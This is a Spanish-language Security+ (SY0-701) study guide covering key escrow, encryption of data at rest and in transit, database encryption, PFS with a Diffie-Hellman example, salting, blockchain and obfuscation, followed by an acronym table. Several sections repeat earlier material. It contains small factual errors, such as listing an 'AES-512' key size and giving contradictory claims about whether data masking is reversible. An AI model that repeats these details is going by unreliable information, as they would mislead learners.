### Soluciones: Custodia y Control M de N

- **Custodia (Key Escrow):** La clave se archiva con un **tercero** de forma independiente.
- **M de N:** Una operación **no puede realizarla una sola persona**. Requiere que un **quórum (M)** de personas disponibles **(N)** autoricen la operación.

### División de claves

- La clave se divide en partes → cada parte la custodia un proveedor diferente.
- **KRA** (Key Recovery Agent / Agente de Recuperación de Claves): Cuenta con permiso para acceder a una clave en custodia.
- Una política puede requerir **dos o más KRA** para autorizar la recuperación → mitiga el riesgo de suplantación.

> **👉 Enfoque de Examen SY0-701:** Pregunta: "¿Qué control previene que un solo administrador pueda acceder a una clave en custodia?" → **M de N** (también llamado control de quórum). KRA es el agente con acceso a claves en custodia. Distractor: confundir custodia con backup normal — la custodia implica terceros y controles adicionales.

# 3.3 Soluciones Criptográficas

## 3.3.1 Cifrado que Respalda la Confidencialidad

> 🛡️ **Analogía:** El cifrado es como un sobre sellado: aunque el cartero (red) lo lleve, no puede leer su contenido.

### Estados de los datos

| Estado | Descripción | Mecanismo típico |
|---|---|---|
| **Data at rest** (Datos en reposo) | Almacenados en medios persistentes (disco, SSD) | FDE, cifrado de volumen |
| **Data in transit** (Datos en tránsito / en movimiento) | Transmitidos a través de una red | TLS, IPsec, WPA |
| **Data in use** (Datos en uso / en procesamiento) | Presentes en memoria volátil (RAM, caché, registros) | Enclaves seguros (TEE) |

### Cifrado masivo (Bulk Encryption)

- Cifrar megabytes o gigabytes de datos = **cifrado masivo**.
- El cifrado **asimétrico** no se usa para cifrado masivo → **demasiado lento**.
- Se usa **cifrado simétrico** (ej. `AES`) para datos masivos.

### Esquema híbrido para cifrado de datos

```
1. Usuario genera par de claves asimétricas (RSA o ECC)
   → Clave privada cifrada: requiere credencial del usuario para usarla
   → Esta clave privada = KEK (Key Encryption Key / Clave de Cifrado de Clave)

2. Sistema genera clave simétrica (AES-256 o AES-512)
   → Esta es la DEK (Data Encryption Key / Clave de Cifrado de Datos)
   → La DEK cifra los datos objetivo

3. La DEK se cifra usando la parte PÚBLICA de la KEK

4. Para acceder a los datos:
   → Usuario proporciona contraseña/sesión autenticada
   → Clave privada (KEK) descifra la DEK
   → La DEK descifra los datos
```

> **👉 Enfoque de Examen SY0-701:** Memoriza: **KEK** (Key Encryption Key) cifra a la **DEK** (Data Encryption Key) que cifra los datos. Pregunta trampa: "¿Se usa cifrado asimétrico para cifrar datos en disco?" → **NO directamente** — cifra la clave simétrica (DEK) que a su vez cifra los datos.

## 3.3.2 Cifrado de Archivos y Discos

> **Analogía:** El cifrado de disco completo es como blindar todo el maletero de un coche — aunque te roben el coche (disco), no pueden acceder al contenido sin la llave. El cifrado de archivos es como poner un candado individual en cada maleta dentro del maletero.

### Niveles de cifrado de datos en reposo

```
[Nivel más alto — más granular]
  Cifrado de archivo individual (EFS)
  Cifrado de columna/celda en BD
  Cifrado de volumen (BitLocker, FileVault)
  Cifrado de disco completo (FDE)
[Nivel más bajo — más simple]
```

### FDE (Full Disk Encryption / Cifrado de Disco Completo)

- Cifra **todo el contenido** del dispositivo: datos, metadatos, espacio libre.
- Protege principalmente contra **robo físico del disco**.
- Sin FDE: un disco robado puede montarse en cualquier PC → acceso total.
- Con FDE: el disco debe desbloquearse con credenciales antes de acceder a la clave de descifrado.

**SED (Self-Encrypting Drive / Unidad de Autocifrado):**
- HDD, SSD o USB flash con producto criptográfico integrado en **firmware**.
- El firmware implementa un criptoprocesador → claves no expuestas al SO.

### Cifrado de particiones

- Un disco puede dividirse en **particiones** (áreas lógicas separadas).
- Posible cifrar selectivamente:
  - Particiones de arranque/sistema: dejar sin cifrar (solo archivos estándar del SO).
  - **Partición de datos**: proteger con cifrado.

### Cifrado de volúmenes

- **Volumen:** Recurso de almacenamiento con un único sistema de archivos (puede ser partición, RAID, disco extraíble).
- Productos de cifrado de volumen: implementados como **software** (no firmware).
- Ejemplos:
  - `BitLocker` (Microsoft) — cifrado de volumen.
  - `FileVault` (Apple) — cifrado de volumen.
- Puede o no cifrar espacio libre o metadatos.

### Cifrado de archivos individuales

- Software que aplica cifrado a **archivos individuales** (o carpetas/directorios).
- Ejemplo: **EFS** (Encrypting File System / Sistema de Archivos de Cifrado de Microsoft).
  - Requiere volumen formateado con `NTFS`.

**Metadatos y espacio libre:**
- **Metadatos:** Lista de archivos, propietario, fechas de creación/modificación.
- **Espacio libre/no asignado:** Puede contener restos de datos (archivos "eliminados" pero no borrados físicamente).

> Si el dispositivo tiene TPM o HSM compatible, el sistema puede bloquearse mediante claves almacenadas en el TPM/HSM.

> **👉 Enfoque de Examen SY0-701:** Pregunta: "¿Qué cifra los metadatos y el espacio libre?" → **FDE**. Diferencia clave: SED = hardware (firmware del disco), BitLocker/FileVault = software (cifrado de volumen). EFS requiere NTFS. Distractor: "BitLocker es FDE" — técnicamente es **cifrado de volumen**, aunque en la práctica suele aplicarse al disco completo.

## 3.3.3 Cifrado de Base de Datos

> **Analogía:** Cifrar una base de datos es como poner diferentes niveles de seguridad en un edificio: puedes cifrar toda la planta (base de datos), una sala específica (tabla), o incluso un cajón concreto (celda/columna).

### Estructura de una base de datos

- **Tablas** → **Columnas** (campos con tipo de datos) + **Filas** (registros).
- Acceso mediado por **DBMS** (Database Management System / Sistema de Gestión de Base de Datos) usando **SQL** (Structured Query Language / Lenguaje de Consulta Estructurado).

### Niveles de cifrado en BD

#### Nivel 1: Cifrado de Base de Datos (TDE)

- **TDE** (Transparent Data Encryption / Cifrado de Datos Transparente): cifrado a nivel de base de datos o página.
- Opera cuando los datos se transfieren entre **disco y memoria**.
- Cifra todos los registros en disco + los registros generados por la BD.
- Protege contra robo de los medios subyacentes.
- Implementado en: `Microsoft SQL Server`.

#### Nivel 2: Cifrado de Celda/Columna

- Se aplica a uno o más **campos** dentro de una tabla.
- Menor impacto en rendimiento vs. TDE.
- El administrador debe identificar qué campos necesitan protección.
- **Always Encrypted** (SQL Server): los datos permanecen cifrados incluso en memoria.
  - Solo se descifran cuando la aplicación cliente suministra la clave.
  - La clave de texto plano **no está disponible para el DBMS**.
  - Permite **separación de funciones**: el admin de BD no puede ver los datos → importante para privacidad.

#### Nivel 3: Cifrado a Nivel de Registro/Fila

- Cada cliente/registro puede tener un **par de claves separado**.
- Control granular sobre quién puede acceder a qué datos.
- Ejemplo: aseguradora de salud → cada paciente tiene sus registros protegidos por claves distintas.
- Importante para cumplimiento de normativas de privacidad.

### Comparativa de niveles de cifrado en BD

| Nivel | Granularidad | Rendimiento | Casos de uso |
|---|---|---|---|
| **TDE** (base de datos/página) | Toda la BD | Impacto adverso | Protección contra robo de medios |
| **Columna/celda** | Campo específico | Menor impacto | Datos sensibles concretos, separación de funciones |
| **Registro/fila** | Registro individual | Variable | Cumplimiento normativo, acceso individualizado |

> **👉 Enfoque de Examen SY0-701:** Pregunta: "¿Qué mecanismo permite que el DBA (administrador de BD) no pueda ver datos cifrados?" → **Always Encrypted** / cifrado a nivel de columna con clave en cliente. TDE protege contra robo del disco, pero el DBA SÍ puede ver los datos en memoria. Distractor: confundir TDE con "Always Encrypted" — son diferentes niveles de protección.

## 3.3.4 Cifrado de Transporte e Intercambio de Claves

> **Analogía:** El sobre digital es como enviar un mensaje en una caja de seguridad: cifras el mensaje con el candado del destinatario (clave pública), y dentro de la caja metes también tu llave (clave de sesión) bloqueada con otro candado del destinatario.

### Protocolos de cifrado de transporte

| Protocolo | Protege | Uso típico |
|---|---|---|
| `WPA` (Wi-Fi Protected Access / Acceso Wi-Fi Protegido) | Tráfico inalámbrico | Redes WiFi |
| `IPsec` (Internet Protocol Security) | Tráfico entre dos puntos en red pública | **VPN** (Virtual Private Network) |
| `TLS` (Transport Layer Security / Seguridad de la Capa de Transporte) | Datos de aplicación (web, email) | HTTPS, correo seguro |

### Sobre digital (Digital Envelope) — Flujo de intercambio de claves

```
1. Alice obtiene clave pública RSA/ECC de Bob (vía certificado digital)
2. Alice cifra su mensaje con un cifrado simétrico (AES)
   → La clave simétrica = CLAVE DE SESIÓN
3. Alice cifra la clave de sesión con la clave pública de Bob
4. Alice adjunta la clave de sesión cifrada al mensaje (= sobre digital)
5. Alice envía el sobre a Bob
6. Bob descifra la clave de sesión con su CLAVE PRIVADA
7. Bob descifra el mensaje con la clave de sesión
```

### Integridad y autenticidad en el transporte

**HMAC** (Hash-based Message Authentication Code / Código de Autenticación de Mensajes Basado en Hash):
- Combina la **clave secreta** (derivada del intercambio) + **hash del mensaje**.
- Garantiza que el mensaje no fue modificado por alguien que no sea el remitente.

**AE** (Authenticated Encryption / Cifrado Autenticado):
- Modo de operación del cifrado simétrico que garantiza **confidencialidad + integridad/autenticidad** simultáneamente.

> **👉 Enfoque de Examen SY0-701:** Pregunta: "¿Qué garantiza el HMAC?" → **Integridad y autenticidad** (no confidencialidad). IPsec → VPN. TLS → HTTPS. Distractor: pensar que el sobre digital cifra directamente con clave asimétrica — lo que cifra asimétricamente es la **clave de sesión**, no el mensaje.

## 3.3.5 Secreto de Reenvío Perfecto (PFS)

> ⏳ **Analogía:** Sin PFS es como usar siempre la misma llave maestra para todas las sesiones — si alguien copia esa llave, puede abrir todas las cajas pasadas y futuras. Con PFS, cada sesión usa una llave diferente que se destruye al terminar.

### El problema sin PFS

- En el modelo básico de sobre digital, si se registra una sesión y **luego** se compromete la clave privada del servidor → se puede descifrar **retroactivamente** la clave de sesión y recuperar todos los datos de la sesión grabada.

### PFS (Perfect Forward Secrecy / Secreto de Reenvío Perfecto)

- Usa el **acuerdo de claves Diffie-Hellman (D-H)** para crear **claves de sesión efímeras** **sin usar la clave privada del servidor**.
- La autenticidad del servidor se demuestra mediante **firma digital** (separada del proceso de generación de clave).

### Protocolo Diffie-Hellman — Cómo funciona

```
Valores públicos acordados: p=23, g=9

Alice:
→ Elige número secreto a=5
→ Calcula A = g^a mod p = 9^5 mod 23 = 8
→ Envía A=8 a Bob

Bob:
→ Elige número secreto b=3
→ Calcula B = g^b mod p = 9^3 mod 23 = 16
→ Envía B=16 a Alice

Cálculo del secreto compartido:
Alice: s = B^a mod p = 16^5 mod 23 = 6
Bob:   s = A^b mod p = 8^3 mod 23 = 6
→ ¡Ambos obtienen el mismo valor s=6!

Mallory conoce: p, g, A, B → PERO no puede calcular s sin conocer a o b
```

### Ventajas del PFS

- Compromiso **futuro** del servidor **no** compromete sesiones pasadas.
- Si un atacante obtiene la clave de **una sesión**, las demás permanecen confidenciales.
- Aumenta masivamente el trabajo criptográfico para recuperar una "conversación" completa.

### Implementaciones de PFS

| Implementación | Descripción |
|---|---|
| `DHE` (Diffie-Hellman Ephemeral) | PFS con aritmética modular |
| `ECDHE` (Elliptic Curve DHE) | **Implementación más habitual actualmente** — D-H en curva elíptica |

> **👉 Enfoque de Examen SY0-701:** Pregunta: "¿Qué previene que el compromiso de la clave privada del servidor exponga sesiones pasadas?" → **PFS**. "¿Qué protocolo usa PFS?" → **DHE / ECDHE**. Distractor: confundir PFS con confidencialidad en tiempo real — PFS protege el **historial grabado** de sesiones pasadas, no solo las futuras. ECDHE es la implementación más moderna.

## 3.3.6 Salting y Key Stretching

> 🧂 **Analogía:** El salting es como añadir una huella dactilar única a cada contraseña antes de cifrarla — aunque dos personas tengan la misma contraseña, sus hashes serán completamente diferentes.

### El problema de la baja entropía en contraseñas

- Los usuarios eligen contraseñas predecibles (baja entropía).
- Las funciones hash son **unidireccionales** pero vulnerables a:
  - **Ataque de fuerza bruta:** Prueba todas las combinaciones posibles.
  - **Ataque de diccionario:** Genera hashes de palabras/frases comunes y busca coincidencias.
  - **Rainbow tables:** Tablas de hashes precalculados.

### Salting

**Salt / Valor de sal:** Valor aleatorio único añadido a la contraseña antes de calcular el hash.

```
Fórmula: (sal + contraseña) * SHA = hash
```

- Un **salt único por cada cuenta de usuario**.
- El salt **no es secreto** — cualquier sistema que verifique el hash debe conocerlo.
- Mitiga rainbow tables: obliga al atacante a **recalcular hashes** con el salt específico de cada contraseña.
- Mitiga que contraseñas idénticas produzcan hashes idénticos en el archivo de contraseñas.

### Key Stretching (Estiramiento de Claves)

- Toma una clave (de contraseña + salt) y la pasa por **miles de rondas de hashing** → produce una clave más larga y desordenada.
- **No fortalece la clave** en sí, pero **ralentiza el ataque** (el atacante debe replicar todo ese procesamiento para cada posible clave).

**Implementación:**
- **PBKDF2** (Password-Based Key Derivation Function 2 / Función de Derivación de Claves Basada en Contraseñas 2):
  - Ampliamente usado para hash y almacenamiento de contraseñas.
  - Utilizado como parte del estándar `WPA` (Wi-Fi Protected Access).

> **👉 Enfoque de Examen SY0-701:** Pregunta: "¿Qué previene los ataques de rainbow table?" → **Salting**. "¿Qué ralentiza los ataques de fuerza bruta contra contraseñas?" → **Key stretching**. "¿Qué estándar usa PBKDF2?" → **WPA**. Distractor: el salt no es secreto — su función es hacer únicos los hashes, no ocultarse.

## 3.3.7 Blockchain

> **Analogía:** La blockchain es como un libro contable que se escribe con tinta permanente y cada página nueva incluye una referencia criptográfica a la anterior. Cambiar cualquier página pasada haría que toda la cadena dejara de cuadrar — y todos los participantes lo notarían.

### Conceptos clave de Blockchain

- **Bloque (Block):** Registro transaccional individual.
- Cada bloque se procesa con una **función hash**.
- El **hash del bloque anterior** se incorpora al cálculo del hash del siguiente bloque → **encadenamiento criptográfico**.
- Cada bloque valida el hash del anterior hasta el principio de la cadena → garantiza que **ninguna transacción histórica ha sido manipulada**.
- Cada bloque incluye: **marca de tiempo** + datos de las transacciones.

### Características de la Blockchain

| Característica | Descripción |
|---|---|
| **Open Public Ledger** (Libro público abierto) | El registro es público y visible para todos |
| **Descentralizada** | No existe como archivo único en una sola computadora |
| **Red P2P** (Peer-to-Peer) | Distribuida para mitigar riesgos de punto único de falla/compromiso |
| **Apertura** | Todos tienen la misma capacidad de ver todas las transacciones |
| **Confianza igualitaria** | Los usuarios de blockchain pueden confiar entre sí por igual |

### Aplicaciones potenciales

- Integridad y transparencia de **transacciones financieras**
- **Contratos legales**
- **Protección de derechos de autor** y propiedad intelectual (PI)
- **Sistemas de votación** en línea
- **Gestión de identidad**
- **Almacenamiento de datos** seguro

> **👉 Enfoque de Examen SY0-701:** Pregunta: "¿Qué propiedad de seguridad garantiza principalmente la blockchain?" → **Integridad** (y no repudio de transacciones). "¿Qué característica de la blockchain mitiga el punto único de falla?" → **Descentralización / red P2P**. Distractor: la blockchain NO proporciona confidencialidad por sí misma — es pública. La inmutabilidad proviene del encadenamiento de hashes, no del cifrado.

## 3.3.8 Ofuscación

> **Analogía:** La ofuscación es como esconder el dinero dentro de un libro en la estantería. No lo cifras, solo lo haces difícil de encontrar. Por sí sola no es suficiente, pero combinada con otras técnicas puede ser útil.

### Concepto

La ofuscación hace que un mensaje o dato sea **difícil de encontrar**. Es una forma de "seguridad por oscuridad" — generalmente considerada obsoleta por sí sola, pero tiene usos legítimos específicos.

### Técnicas de ofuscación

#### 1. Esteganografía (Steganography)

- Literalmente: "escritura oculta".
- **Incrustar información** dentro de una fuente inesperada (ej. mensaje oculto en una imagen).
- El archivo/documento contenedor = **covertext**.
- Puede combinarse con cifrado para proporcionar **confidencialidad**.
- Puede proporcionar **integridad o no repudio** (ej. probar que algo se imprimió en un dispositivo concreto en un momento determinado → auténtico o falso).

#### 2. Enmascaramiento de datos (Data Masking)

- Todo o parte del contenido de un campo de BD se **redacta** (ej. sustituyendo por "x").
- **Supresión parcial:** Se preservan metadatos para análisis (ej. conservar prefijo telefónico, suprimir número de abonado).
- Puede preservar el **formato original** del campo.

#### 3. Tokenización (Tokenization)

- Reemplaza todo o parte del valor de un campo por un **token generado aleatoriamente**.
- El token se almacena con el valor original en un **servidor de tokens / bóveda de tokens** → **separado de la BD de producción**.
- Es **reversible**: una consulta/aplicación autorizada puede recuperar el valor original.
- Se usa como **sustituto del cifrado** desde una perspectiva regulatoria (un campo tokenizado ≠ datos originales en términos regulatorios).

### Tabla comparativa de técnicas de ofuscación

| Técnica | Reversible | Protege | Caso de uso principal |
|---|---|---|---|
| **Esteganografía** | Sí (con conocimiento del método) | Existencia del mensaje | Canales encubiertos, marcas de agua digitales |
| **Data Masking** | Parcialmente | Datos personales en análisis | Entornos de desarrollo/prueba, cumplimiento |
| **Tokenización** | Sí (con bóveda de tokens) | Datos sensibles en BD de producción | PCI-DSS, datos de tarjetas de crédito |

### Desidentificación

- **Data masking** + **tokenización** se usan para la **desidentificación**.
- **Desidentificación:** Ofuscar datos personales en bases de datos para que puedan **compartirse sin comprometer la privacidad**.

> **👉 Enfoque de Examen SY0-701:** Pregunta: "¿Qué técnica de ofuscación es reversible y almacena el valor original en un servidor separado?" → **Tokenización**. "¿Qué incrustar un mensaje en una imagen?" → **Esteganografía** (covertext). Diferencia clave: **tokenización vs. cifrado** — desde una perspectiva regulatoria, un campo cifrado tiene el mismo valor que los datos originales; un campo tokenizado no. Distractor: confundir data masking (irreversible) con tokenización (reversible).

---

## 3.8 Gestión de claves

El ciclo de vida de una clave criptográfica comprende las siguientes etapas:

1. **Generación:** Creación matemática del par de claves o de la clave secreta mediante generadores pseudoaleatorios robustos.
2. **Almacenamiento:** Protección de las claves privadas o secretas contra accesos no autorizados, garantizando además su disponibilidad mediante copias de respaldo.
3. **Revocación:** Anulación del uso de la clave en caso de compromiso. Los datos previamente cifrados deben volver a cifrarse con una nueva clave.
4. **Caducidad y Renovación:** Definición de un período de validez para mitigar ataques prolongados. Al expirar, se puede renovar con el mismo par o generar uno nuevo.

## 3.9 Criptoprocesadores y enclaves seguros

La seguridad de un sistema criptográfico completo depende en última instancia de cómo se protejan y manipulen sus claves.

### TPM vs. HSM

| Característica | TPM (Trusted Platform Module) | HSM (Hardware Security Module) |
|---------------|------------------------------|-------------------------------|
| **Formato** | Chip soldado a la placa base. | Dispositivo externo o tarjeta PCI de grado industrial. |
| **Escala** | Uso individual en portátiles y servidores. | Uso masivo en centros de datos. |
| **Funciones principales** | Arranque seguro (Secure Boot), almacenamiento de claves, asistencia a BitLocker. | Generación y procesamiento de claves a gran escala, firmas digitales corporativas, protección de la CA raíz. |
| **Protección física** | Básica (integrada en el hardware del equipo). | Avanzada: autodestrucción de claves ante intrusión, sensores de calor y voltaje. |

### Custodia de Claves y Recuperación

- **Key Escrow:** Entrega de una copia de las claves a un tercero de confianza o entidad gubernamental, garantizando el acceso a los datos si el propietario los pierde o en el marco de una orden judicial.
- **M de N (Quórum):** Requiere que un número mínimo **M** de custodios autorizados de un grupo total de **N** estén presentes simultáneamente para ejecutar operaciones críticas. Previene el abuso de poder de un único administrador.

### Enclaves Seguros

La debilidad crítica de cualquier criptoprocesador es que **los datos descifrados deben cargarse en la RAM en texto plano** para ser procesados, lo que los expone a malware o exploits de lectura de memoria. Un **Enclave Seguro** (como Intel SGX) mitiga esto aislando a nivel de hardware áreas de memoria exclusivas, accesibles únicamente por procesos firmados digitalmente y autorizados.

## 3.10 Custodia de Claves (Key Escrow)

Si una clave privada o simétrica se pierde, toda la información cifrada con ella quedará permanentemente inaccesible. Para mitigar este riesgo se utilizan dos controles:

1. **Key Escrow:** Almacenar una copia de la clave con un tercero independiente de confianza (o entidad gubernamental bajo orden judicial).
2. **Esquema M de N (Quórum):** Una operación crítica no puede ser ejecutada por una única persona. Se requiere el consenso de un mínimo **M** de custodios de un grupo de **N**. Ejemplo: 3 de 5 custodios deben aprobar la recuperación de la clave maestra. Previene el abuso de poder de un único administrador.
- **KRA (Key Recovery Agent):** Rol o cuenta con permisos explícitos para acceder e importar claves mantenidas en custodia.


## 3.11 Ofuscación

La ofuscación consiste en alterar datos, código o mensajes para hacerlos difíciles de identificar o comprender por parte de personas no autorizadas. Se fundamenta en la «seguridad por oscuridad», obsoleta por sí sola pero útil como capa complementaria.

### Esteganografía

Técnica que **oculta la existencia misma** de la información dentro de un archivo contenedor aparentemente inofensivo (*covertext*), como una imagen digital, un archivo de audio o un vídeo.

- **Mecanismo técnico:** Modificar los **bits menos significativos (LSB)** de los píxeles de una imagen para insertar datos ocultos. Los cambios de color resultantes son imperceptibles para el ojo humano.
- **Uso malicioso:** Evadir sistemas de inspección profunda de paquetes (DPI) o herramientas de prevención de fuga de datos (DLP).
- **Uso legítimo:** Marcas de agua digitales imperceptibles para rastrear la procedencia o detectar la alteración de documentos.

### Enmascaramiento de Datos (Data Masking)

Técnica que protege la confidencialidad de datos sensibles mediante su modificación o sustitución, especialmente en bases de datos de desarrollo o pruebas.

- **Enmascaramiento Estático:** Modifica permanentemente los datos en una copia de la base de producción antes de trasladarla a entornos de prueba.
- **Enmascaramiento Dinámico:** Intercepta la consulta en tiempo real y sustituye los datos según el rol del usuario (ej. mostrar solo los últimos 4 dígitos de una tarjeta: `************1234`).

### Tokenización

Reemplaza un dato sensible (como el número de tarjeta de crédito) por un sustituto aleatorio no sensible llamado **token**.

- **Diferencia con el cifrado:** El token no es el resultado de una fórmula matemática reversible; es una referencia que requiere consultar una base de datos segura (*token vault*), compatible con estándares como PCI-DSS.

## 3.12 Cifrado que Respalda la Confidencialidad

Si los datos se cifran correctamente, incluso si los discos son robados físicamente o los paquetes de red son interceptados, la información permanece protegida.

### Los Tres Estados de los Datos

| Estado | Descripción | Control de seguridad típico |
|--------|-------------|----------------------------|
| **Datos en Reposo** *(Data at Rest)* | Información almacenada en medios no volátiles (HDD, SSD, cintas, NAS). | FDE, cifrado de volúmenes o archivos. |
| **Datos en Tránsito** *(Data in Transit)* | Información viajando por una red pública o privada. | TLS, IPsec, WPA. |
| **Datos en Uso** *(Data in Use)* | Información activa cargada en la RAM o caché de la CPU. | Enclaves seguros (Intel SGX). |

### El Esquema de Cifrado Estándar (Confidencialidad de Archivos)

La mayoría de los sistemas criptográficos combinan cifrado simétrico y asimétrico de forma complementaria:

1. El sistema genera una clave simétrica temporal (**DEK - Data Encryption Key**) que cifra los datos de forma masiva y rápida.
2. La DEK se protege cifrándola con la clave pública asimétrica del usuario (**KEK - Key Encryption Key**).
3. Para descifrar, el usuario autenticado usa su clave privada (KEK) para recuperar la DEK, y esta para descifrar los datos.

### Cifrado de Archivos y Discos

- **FDE (Full Disk Encryption):** Cifra absolutamente todo el contenido de un dispositivo: particiones, espacio libre y metadatos del sistema. Protege principalmente contra el **robo físico** del dispositivo.
- **Cifrado de Volúmenes:** Cifra particiones o unidades lógicas específicas mediante software del sistema operativo. Ejemplos: **BitLocker** (Microsoft) y **FileVault** (Apple).

### Cifrado de Bases de Datos

El cifrado a nivel de base de datos permite una protección más granular que el FDE:

- **Cifrado de Celda o Columna:** Se cifran únicamente los campos más sensibles (ej. solo la columna «Número de Tarjeta»), reduciendo el impacto en el rendimiento de las consultas.
- **Always Encrypted (SQL Server):** Los datos permanecen cifrados incluso cuando se cargan en la memoria RAM del servidor. Solo se descifran en el lado de la aplicación cliente cuando esta suministra la clave legítima. El administrador de la base de datos (DBA) nunca tiene acceso al texto plano.

### Cifrado de Transporte e Intercambio de Claves

| Protocolo | Uso principal |
|-----------|--------------|
| **WPA / WPA3** | Cifrado de redes inalámbricas locales (Wi-Fi). |
| **IPsec** | Cifrado de tráfico IP entre dos extremos; base de las VPNs. |
| **TLS** | Cifrado de datos de aplicaciones a través de Internet (HTTPS, SMTPS, IMAPS). |

### Secreto de Reenvío Perfecto (Perfect Forward Secrecy - PFS)

En los esquemas clásicos, la clave de sesión simétrica se intercambia usando la clave privada de largo plazo del servidor. Si esa clave privada se ve comprometida en el futuro, un atacante que haya grabado el tráfico pasado podría descifrarlo todo retroactivamente.

El **PFS** elimina este riesgo utilizando el protocolo de acuerdo de claves **Diffie-Hellman efímero (DHE o ECDHE)**: Diffie-Hellman permite que dos partes generen el mismo secreto compartido a través de un canal inseguro sin necesidad de transferirlo directamente. Las claves de sesión generadas son únicas, temporales y se descartan de la memoria al cerrar la sesión, sin depender jamás de la clave privada de largo plazo para el descifrado.

> 🔑 **Clave de examen:** PFS garantiza que el compromiso futuro de la clave privada del servidor **no compromete** la confidencialidad de las sesiones pasadas.

### Protección de Contraseñas (Salting y Stretching)

Las contraseñas no se almacenan como texto plano, sino como hashes. Para protegerlos contra ataques de tablas arcoíris (diccionarios de hashes precalculados):

- **Salting:** Se añade un valor aleatorio único a cada contraseña antes de calcular su hash. Dos usuarios con la misma contraseña tendrán hashes completamente diferentes.
- **Key Stretching:** El proceso de hashing se repite miles de veces (ej. mediante PBKDF2 o bcrypt) para ralentizar significativamente los ataques de fuerza bruta.

## 3.13 Blockchain (Cadena de Bloques)

Un registro o libro contable digital, distribuido, descentralizado e inmutable diseñado para registrar transacciones de forma segura y verificable.

### Componentes de Seguridad en Blockchain

- **Libro Mayor Distribuido:** Los datos no se almacenan en un servidor central, sino que se replican en múltiples nodos de una red P2P, eliminando el punto único de fallo.
- **Encadenamiento Criptográfico por Hash:** Cada bloque contiene el hash del bloque anterior. Si un atacante modifica un dato en el bloque 3, su hash cambia, rompiendo el enlace con el bloque 4 e invalidando toda la cadena subsiguiente. Para manipular el registro, el atacante debería recalcular toda la cadena en la mayoría de los nodos simultáneamente.
- **Consenso:** Mecanismos que garantizan que todos los nodos coincidan en el estado del libro mayor. Los más comunes son *Proof of Work* y *Proof of Stake*.

## 3.14 Tabla Resumen

| Concepto | Sigla / Acrónimo | Función principal |
|---|---|---|
| Criptografía | — | Asegurar información codificándola |
| Cifrado simétrico | — | Confidencialidad (misma clave) |
| Cifrado asimétrico | — | Autenticación + confidencialidad (par de claves) |
| Hashing | — | Integridad (unidireccional) |
| Firma digital | — | Integridad + autenticación + no repudio |
| Estándar de Cifrado Avanzado | **AES** | Cifrado simétrico masivo |
| Rivest, Shamir, Adelman | **RSA** | Cifrado asimétrico (mín. 2048 bits) |
| Criptografía de Curva Elíptica | **ECC** | Asimétrico eficiente (256 bits ≈ RSA-3072) |
| Algoritmo de Hash Seguro 256 | **SHA-256** | Hash estándar (256 bits) |
| Algoritmo de Resumen de Mensajes 5 | **MD5** | Hash débil (128 bits, solo compatibilidad) |
| Algoritmo de Firma Digital | **DSA** | Firma digital (base: ElGamal) |
| ECDSA | **ECDSA** | Firma digital en curva elíptica (actual) |
| Infraestructura de Clave Pública | **PKI** | Framework de confianza con certificados |
| Autoridad Certificadora | **CA** | Valida identidad y emite certificados |
| Solicitud de Firma de Certificado | **CSR** | Solicitud del sujeto a la CA |
| Nombre de Dominio Completamente Calificado | **FQDN** | Identificador completo del host |
| Nombre Común | **CN** | Campo de certificado (en desuso para FQDN) |
| Nombre Alternativo del Sujeto | **SAN** | Campo moderno para identificación del servidor |
| Nombre Distinguido | **DN** | Identificador completo del sujeto en el certificado |
| Lista de Revocación de Certificados | **CRL** | Lista de certificados revocados/suspendidos |
| Protocolo de Estado de Certificados en Línea | **OCSP** | Estado en tiempo real de un certificado |
| Protocolo de Interoperabilidad de Gestión de Claves | **KMIP** | Comunicación con servidor de gestión de claves |
| Módulo de Plataforma Confiable | **TPM** | Criptoprocesador para plataforma específica |
| Módulo de Seguridad de Hardware | **HSM** | Criptoprocesador centralizado/portátil |
| Generador de Números Pseudoaleatorios | **PRNG** | Generación de números "aleatorios" por software |
| Generador de Números Aleatorios Verdaderos | **TRNG** | Entropía real (ruido físico) |
| Interfaz de Programación de Aplicaciones | **API** | Comunicación con criptoprocesador (PKCS#11) |
| Entorno de Ejecución Confiable | **TEE** | Enclave seguro en memoria (ej. Intel SGX) |
| Extensiones de Guardia de Software de Intel | **SGX** | Implementación TEE de Intel |
| Agente de Recuperación de Claves | **KRA** | Cuenta con acceso a claves en custodia |
| Datos en reposo | **Data at rest** | Almacenados en medios persistentes |
| Datos en tránsito | **Data in transit** | Transmitidos por red |
| Datos en uso | **Data in use** | En memoria volátil |
| Clave de Cifrado de Clave | **KEK** | Clave asimétrica que cifra la DEK |
| Clave de Cifrado de Datos | **DEK** | Clave simétrica que cifra los datos |
| Cifrado de Disco Completo | **FDE** | Cifra todo el disco |
| Unidad de Autocifrado | **SED** | Disco con cifrado en firmware |
| Sistema de Archivos de Cifrado | **EFS** | Cifrado de archivos en Windows (requiere NTFS) |
| Cifrado de Datos Transparente | **TDE** | Cifrado a nivel de base de datos (SQL Server) |
| Acceso Wi-Fi Protegido | **WPA** | Cifrado de tráfico inalámbrico |
| Seguridad de Protocolo de Internet | **IPsec** | VPN / cifrado entre dos puntos |
| Seguridad de la Capa de Transporte | **TLS** | Cifrado de datos de aplicación (HTTPS) |
| Red Privada Virtual | **VPN** | Red privada sobre infraestructura pública (vía IPsec) |
| Código de Autenticación de Mensajes Basado en Hash | **HMAC** | Integridad + autenticidad de mensajes |
| Cifrado Autenticado | **AE** | Modo simétrico: confidencialidad + integridad |
| Secreto de Reenvío Perfecto | **PFS** | Claves de sesión efímeras, protege historial |
| Diffie-Hellman Efímero | **DHE** | Implementación de PFS con aritmética modular |
| ECDHE | **ECDHE** | PFS en curva elíptica (implementación actual) |
| Función de Derivación de Claves Basada en Contraseñas 2 | **PBKDF2** | Key stretching, usado en WPA |
| Blockchain | — | Registro distribuido con integridad criptográfica |
| Esteganografía | — | Mensaje oculto en covertext |
| Enmascaramiento de datos | **Data Masking** | Redacción de campos de BD |
| Tokenización | — | Sustitución por token aleatorio (reversible) |
| Normas Federales de Procesamiento de Información | **FIPS** | Estándar EE.UU. (FIPS 140-2 para HSMs) |
| Estándares de Criptografía de Clave Pública | **PKCS** | Conjunto de estándares de RSA para PKI |

---

# 4. Implementación de la gestión de identidades y accesos

## 4.1 Autenticación
 
> **Concepto clave:** La autenticación verifica que **solo el titular legítimo de una cuenta** pueda utilizarla. Es diferente de la autorización (qué puede hacer una vez dentro).
 
### Arquitectura básica del proceso de autenticación
 
```
Solicitante (Demandante)  →  Credenciales  →  Servidor de Autenticación
                                                       ↓
                                          Compara con copia almacenada
                                                       ↓
                                          ✅ Coincide → Acceso concedido
                                          ❌ No coincide → Acceso denegado
```
 
